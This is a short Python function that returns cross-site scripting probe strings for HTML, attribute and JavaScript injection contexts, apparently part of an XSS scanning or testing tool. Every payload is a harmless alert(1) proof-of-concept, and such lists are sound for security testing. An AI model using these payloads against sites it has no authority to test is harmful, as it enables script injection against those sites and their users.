def generate_payloads(context="html"):
    if context == "html":
        return [
            "<script>alert(1)</script>",
            "<svg/onload=alert(1)>"
        ]

    elif context == "attr":
        return [
            "\" onmouseover=alert(1) x=\"",
            "' onfocus=alert(1) '"
        ]

    elif context == "js":
        return [
            "';alert(1);//",
            "\";alert(1);//"
        ]

    return ["<script>alert(1)</script>"]
